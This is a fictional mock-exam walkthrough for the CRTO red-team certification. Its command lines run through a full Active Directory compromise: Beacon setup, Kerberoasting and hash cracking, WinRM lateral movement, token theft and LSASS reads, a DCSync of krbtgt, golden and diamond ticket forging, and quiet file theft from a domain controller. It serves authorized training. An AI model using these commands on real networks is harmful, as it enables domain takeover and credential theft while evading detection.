# CRTO I — Mock Exam Walkthrough

> **Fictional training scenario.** The domain, hosts, users, and objective below are invented for practice. This is **not** a dump of the real exam, and none of these credentials or hosts exist. Use it to rehearse decisions, command recall, and OPSEC discipline.
>
> **How to use it:** pause at each **Decision Point**, write down what you would do, then read the answer. Do not read the whole thing once and nod — run it in a lab if you can.

---

## 1. The brief

| Item | Detail |
|---|---|
| Domain | `corp.local` (single domain, single forest) |
| DC | `DC01.corp.local` |
| Hosts | `WS01` (helpdesk workstation), `SQL01` (MSSQL), `FS01` (file server), `CA01` (ADCS) |
| Attack host | Windows 10, tools in `C:\Tools` |
| Foothold | A Beacon running as `CORP\alice` on `WS01` |
| Alice | Domain user, member of `Helpdesk`. **No local admin. No Domain Admin.** |
| Objective | Retrieve `C:\ProgramData\ZP\objective.txt` from `DC01`, then upload it to `\\FS01\submissions\<your-id>.txt` |
| Time | 24 hours of active lab time, pausable across a 7-day window |
| Restricted hosts | `DC01`, `CA01` — detections here are heavily penalised |
| Rules | No DoS, no log clearing, no disabling Defender, no attacking the attack host/C2 |
| Scoring | ~50 objective + ~50 OPSEC; 85 to pass |

**The tension:** the objective is on a restricted host. You must touch `DC01` once, quietly, and leave. Every extra action there is a deduction.

---

## 2. Phase 0 — Before you touch anything (T+0:00–0:30)

### Decision Point 1 — What do you do with the Beacon first?

**Write your answer, then read on.**

<details markdown="1">
<summary>Answer</summary>

Do **not** run Mimikatz, `hashdump`, or a host sweep. First:

1. Confirm the Beacon works and is stable (`getuid`, `sleep`).
2. Set or verify the OPSEC baseline: `spawnto`, `blockdlls`, profile, listener port, pipe name.
3. Do quiet host and domain reconnaissance.

A Beacon that lands with a default profile and a `rundll32.exe` parent is already losing points, even before you do anything.

</details>

### Baseline commands

```text
getuid
sleep 60 25
spawnto x64 %windir%\System32\dllhost.exe
spawnto x86 %windir%\SysWOW64\dllhost.exe
blockdlls start
```

**Why `dllhost.exe`?** It is a normal COM surrogate, makes sense as a parent for some activity, and avoids the default `rundll32.exe` signature. The exact choice is less important than not using the default.

**Do not** change the profile mid-exam unless the Beacon is burned. Profile changes require new payloads and new listeners.

---

## 3. Phase 1 — Quiet reconnaissance (T+0:30–1:30)

### Host

```text
whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"
ipconfig /all
route print
netstat -ano | findstr LISTENING
net localgroup administrators
net session
net use
```

**Expected findings:**
- `alice` is a normal user in `Helpdesk`; no local admin, no `SeImpersonate`.
- `WS01` is Windows 10, Defender enabled, AppLocker not enforced (or enforced only for users).
- `WS01` can reach `SQL01:445/5985`, `FS01:445`, `DC01:445/88/389`.

### Security posture

```text
powershell Get-MpComputerStatus
powershell Get-MpConfigurationMode
powershell Get-AppLockerPolicy -Effective -Xml
powershell $ExecutionContext.SessionState.LanguageMode
```

**Expected:** Defender on, real-time on, ASR partially on, AppLocker not enforcing on this host, LanguageMode FullLanguage.

**OPSEC:** these are low-noise admin queries. Running `winPEAS` or `Invoke-UserHunter` here would be louder than necessary.

### Domain

```text
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

powerpick Get-Domain
powerpick Get-DomainSID
powerpick Get-DomainController | select Name,OSVersion
powerpick Get-DomainUser alice | select cn,samaccountname,memberof
powerpick Get-DomainGroupMember -Identity "Helpdesk" -Recurse | select MemberName
powerpick Get-DomainUser -SPN | select cn,samaccountname,serviceprincipalname
powerpick Get-DomainUser -PreauthNotRequired | select cn,samaccountname
powerpick Get-DomainComputer | select cn,dnshostname,operatingsystem
powerpick Get-DomainTrust
```

**Expected findings:**
- `svc_sql` has SPN `MSSQLSvc/sql01.corp.local:1433` — **Kerberoastable**.
- `svc_sql` is in `SQL Admins`.
- `bob` is in `Server Admins`.
- No AS-REP-roastable accounts (or one decoy with a strong password).
- `Helpdesk` has `ForceChangePassword` on `svc_sql` (a louder alternate path).

### BloodHound (DCOnly, quiet)

```text
execute-assembly C:\Tools\SharpHound\SharpHound.exe -c DCOnly --stealth --zipfilename dc.zip
```

Import `dc.zip` into BloodHound. **Expected paths:**

| Path | Chain | OPSEC cost |
|---|---|---|
| **A (recommended)** | `svc_sql` (Kerberoast) → `SQL Admins` → `AdminTo SQL01` → `bob` session → `Server Admins` → `DCSync CORP.LOCAL` → `krbtgt` → `DC01` | Low–medium: one 4769, one WinRM, one 4662 |
| **B** | `Helpdesk` → `ForceChangePassword` → `svc_sql` → same as A | Medium: adds a 4724 password reset |
| **C** | `CA01` ESC1 → certificate as Administrator → `DC01` | High: CA01 is restricted; any detection there is heavily penalised |
| **D** | Local admin reuse `WS01` → `FS01` | Discovery is a noisy SMB sweep; uncertain payoff |

### Decision Point 2 — Which path?

<details markdown="1">
<summary>Answer</summary>

**Path A.** It uses one Kerberos request, one WinRM session, and one targeted DCSync. Path B adds a password reset (4724) and may break the SQL service. Path C touches a restricted host. Path D requires `Find-LocalAdminAccess`, which sweeps SMB across many hosts.

Take the path with the **fewest restricted-host interactions**, not the shortest graph.

</details>

---

## 4. Phase 2 — Kerberoast `svc_sql` (T+1:30–2:00)

```text
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:svc_sql /rc4opsec /nowrap
```

**Expected:** a `$krb5tgs$23$...` hash.

```bash
hashcat -m 13100 svc_sql.txt rockyou.txt -r rules/best64.rule
# expected: Summer2026!
```

**OPSEC:**
- One request for one account, not every SPN.
- `/rc4opsec` avoids noisy/failed requests.
- Run from `WS01` (Tier 2), not from `SQL01` or `DC01`.
- Cracking is offline and invisible.
- 4769 with RC4 (`0x17`) is still logged. One is fine; a burst is not.

**Trap:** roasting every SPN on the domain. That is 20+ 4769 events and no benefit.

---

## 5. Phase 3 — Access `SQL01` (T+2:00–2:45)

### Verify the access path

```text
powerpick Get-NetLocalGroupMember -ComputerName sql01 -GroupName "Remote Management Users"
powerpick Get-NetLocalGroupMember -ComputerName sql01 -GroupName "Administrators"
```

**Expected:** `svc_sql` is in `Remote Management Users` and in the local `Administrators` group via `SQL Admins`.

### Decision Point 3 — WinRM or PsExec?

<details markdown="1">
<summary>Answer</summary>

**WinRM.** `jump winrm64` does not create a service or drop a binary. PsExec creates a service (7045/4697) and a Service EXE that spawns `rundll32.exe` — a known detection.

Use PsExec only if WinRM is blocked, and accept the OPSEC hit.

</details>

```text
make_token CORP\svc_sql Summer2026!
jump winrm64 sql01.corp.local smb
```

**If WinRM fails:** `jump psexec64 sql01.corp.local smb` (louder), or `remote-exec wmi` after uploading a payload (no output).

### On SQL01

```text
getuid
whoami /all
whoami /priv
ps
```

**Expected:** `CORP\svc_sql`, local admin via `SQL Admins`. `ps` shows a `bob` session — for example `explorer.exe` running as `CORP\bob`.

### SQL sysadmin (confirmation)

```text
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql01.corp.local /m:whoami
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql01.corp.local /m:query /c:"SELECT IS_SRVROLEMEMBER('sysadmin')"
```

**Expected:** `1`.

### Decision Point 4 — How do you get `bob`'s credentials?

<details markdown="1">
<summary>Answer</summary>

**Steal `bob`'s token** if he has a process on `SQL01`. `steal_token <pid>` is far quieter than reading LSASS.

If there is no session:
1. `getsystem` (if `svc_sql` has `SeImpersonate`) and then **one** targeted LSASS read — `mimikatz !sekurlsa::ekeys` for AES keys, not `logonpasswords`.
2. Or `Rubeus dump /luid:<id> /nowrap` for `bob`'s tickets.

Do not run `logonpasswords`, then `ekeys`, then `tickets` in a loop. One read, one purpose.

</details>

```text
# Preferred: token theft
ps
steal_token <bob-pid>
getuid
# Expected: CORP\bob

# Fallback: targeted LSASS (once)
getsystem
mimikatz !sekurlsa::ekeys
rev2self
```

**OPSEC:** `steal_token` is Sysmon 10 but does not read LSASS. `getsystem` + `ekeys` is louder; use only if needed.

---

## 6. Phase 4 — `bob` → DCSync (T+2:45–3:15)

BloodHound: `bob` → `Server Admins` → `DCSync` → `CORP.LOCAL`.

### Decision Point 5 — What do you DCSync?

<details markdown="1">
<summary>Answer</summary>

**One principal: `krbtgt`.** `dcsync corp.local CORP\krbtgt`.

Do **not** run `-all`. Do **not** run it on `DC01`. Do it from `SQL01` (Tier 1) with `bob`'s token. One 4662 is a deduction; a replication of every account is a much bigger one.

If you later need a specific account (for example `DC01$` for a silver ticket), do one targeted DCSync for it — not `-all`.

</details>

```text
steal_token <bob-pid>
getuid
dcsync corp.local CORP\krbtgt
```

**Expected:** `krbtgt` NTLM and AES256 keys.

```text
rev2self
```

**OPSEC:**
- 4662 with `DS-Replication-Get-Changes` / `...-All` on `DC01`.
- One request, from a non-DC host, with a token that has a plausible reason to replicate.
- Stop. Do not repeat.

---

## 7. Phase 5 — Reach `DC01` (T+3:15–4:00)

### Decision Point 6 — Golden or diamond ticket?

<details markdown="1">
<summary>Answer</summary>

**Diamond**, if you can obtain a real TGT for `bob`.

A diamond ticket modifies a legitimate TGT with the `krbtgt` AES key, so the ticket has a real issuance chain and looks closer to normal. A golden ticket has no corresponding 4768 and is easier to flag.

Use **AES256**, not RC4. Do **not** add broad groups (`-519`) unless the objective requires it. Use the narrowest identity that can read the file.

If diamond fails, golden with AES256 is the fallback — accept the OPSEC cost.

</details>

```text
# A real TGT for bob (from bob's context / token)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /target:dc01.corp.local /nowrap

# Diamond
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:bob /ticketuserid:<bob-rid> /groups:512 /krbkey:<krbtgt-aes256> /nowrap

# Golden fallback
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt-aes256> /user:bob /domain:corp.local /sid:<domain-sid> /nowrap

# Use it
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>
run klist
```

### Read the objective — quietly

```text
ls \\dc01.corp.local\c$\ProgramData\ZP
download \\dc01.corp.local\c$\ProgramData\ZP\objective.txt
```

**OPSEC on `DC01` — the most important part of the whole exam:**

- **One** SMB read. No `jump`, no service, no task, no execution, no LSASS.
- Do not run `whoami`, `systeminfo`, or enumeration on `DC01`. You already know what you need.
- Do not open a new Beacon on `DC01` unless the objective requires execution there. It does not — you need a file.
- If SMB is blocked, use the **same ticket** with `remote-exec` or a minimal WinRM command; do not fall back to PsExec on a DC.

**If the file is ACL-protected:** the diamond/golden ticket as `bob` may not be enough. Use a ticket for a Domain Admin identity (still AES, still narrow) or a silver ticket for `cifs/DC01` using `DC01$`'s key from a targeted DCSync. Do not start changing ACLs on the DC.

---

## 8. Phase 6 — Upload to `FS01` (T+4:00–4:20)

```text
# bob is a local admin on FS01 (BloodHound)
upload objective.txt \\fs01.corp.local\submissions\<your-id>.txt
```

**If the share rejects the write:**
```text
make_token CORP\bob <password-or-use-token>
ls \\fs01.corp.local\submissions
upload objective.txt \\fs01.corp.local\submissions\<your-id>.txt
rev2self
```

**OPSEC:** one SMB write. No new session, no service, no execution on `FS01` unless required.

**Verify:** `ls \\fs01.corp.local\submissions` shows your file. Record the timestamp.

---

## 9. Phase 7 — Cleanup and submit (T+4:20–4:45)

```text
kerberos_ticket_purge
rev2self
token-store remove-all
job
socks stop
rportfwd stop <port>
unlink
```

Checklist:

- [ ] No services created anywhere (`sc query` on hosts you touched)
- [ ] No scheduled tasks created
- [ ] No payloads/tools left on disk
- [ ] No ACL/RBCD/shadow-credential changes
- [ ] No tickets/tokens left in the session
- [ ] No SOCKS/rportfwd/tunnels open
- [ ] No LSASS access on `DC01` or `CA01`
- [ ] No Defender/logging changes
- [ ] Objective file present on `FS01`
- [ ] Action log complete

---

## 10. The traps, and what they cost

| Trap | Why it is tempting | Cost |
|---|---|---|
| `mimikatz logonpasswords` on `WS01` at T+0 | "Get creds early" | LSASS detection on a workstation; unnecessary |
| `Find-LocalAdminAccess` from `WS01` | "Find an easy admin host" | SMB sweep across many hosts; many 4624/5140 events |
| `jump psexec64` to `SQL01` | "It always works" | 7045/4697 + `rundll32.exe` service EXE |
| `dcsync -all` | "Get everything at once" | Massive 4662 volume; obvious replication abuse |
| Golden ticket with RC4 | "Faster" | RC4 TGT anomaly; no 4768 |
| Adding `-519` / broad SIDs | "Make sure I'm admin" | Over-privileged ticket; anomaly |
| Touching `CA01` "just in case" | "ADCS is easy" | Restricted host; any detection is heavily penalised |
| Opening a Beacon on `DC01` | "I'm DA now" | New process + egress on a Tier-0 host |
| `wevtutil cl Security` | "Hide my tracks" | 1102; almost certainly scored |
| Disabling Defender | "Stop the alerts" | 5001/5007; scored; tamper protection may block it |
| Leaving the SQL service binary | "I might need it" | Durable artifact on a Tier-1 server |

---

## 11. "What if" branches

| Failure | Next move | OPSEC delta |
|---|---|---|
| Kerberoast hash won't crack | Try `svc_sql`'s ACL path (`ForceChangePassword`) or AS-REP | +1 loud reset if ACL |
| WinRM blocked | WMI (`remote-exec wmi`) or PsExec | +service creation |
| No `bob` session on `SQL01` | One targeted `ekeys` read, then clean up | +LSASS access |
| `bob` has no DCSync in BloodHound | Look for ACL → `WriteDacl`; or ADCS ESC1 (restricted) | Higher |
| Diamond fails | Golden with AES256, narrow SID | +anomaly |
| `DC01` SMB blocked | Silver ticket `cifs/DC01` with `DC01$` key (targeted DCSync) | +one DCSync |
| Objective ACL denies `bob` | Ticket as a Domain Admin identity | +broader ticket |
| `FS01` write denied | `bob` token / local admin; verify share ACL | Low |

---

## 12. Score yourself

### Objective (50)

| Check | Points |
|---|---|
| Read `objective.txt` from `DC01` | 25 |
| Uploaded to `\\FS01\submissions\<id>.txt` | 25 |

### OPSEC (50) — suggested deductions

| Issue | Deduct |
|---|---|
| Default C2 profile / port / pipe / `rundll32` parent | 5–10 |
| LSASS access on `DC01` or `CA01` | 10–15 |
| Service creation on a Tier-0 host | 5–10 |
| `dcsync -all` | 5 |
| Golden ticket with RC4 / broad SIDs | 3–5 |
| ACL/RBCD change left behind | 5 |
| Payload/service/task left behind | 3–5 |
| Defender/logging change | 10+ |
| Detection on a restricted host | 5–15 |
| Unnecessary host touched | 2–5 |
| No cleanup | 5 |

**Pass estimate:** objective 50 + OPSEC ≥ 35 = 85. A clean run should land 45+ on OPSEC. If you are losing more than 15 OPSEC points, fix the top three rows before your next attempt.

---

## 13. The one-paragraph summary

Land quiet, customise the C2 before anything runs, use BloodHound `DCOnly` to find the shortest path that touches restricted hosts least, Kerberoast one service account, use WinRM instead of PsExec, steal a token instead of reading LSASS, DCSync one principal from a Tier-1 host, forge a diamond ticket with AES, read the objective from `DC01` with one SMB operation and nothing else, write it to `FS01`, clean up every artifact, and submit.

---

*Companion to `CRTO-Playbook.md` / `CRTO-Playbook.html`. Fictional scenario; for authorized lab and exam study only.*
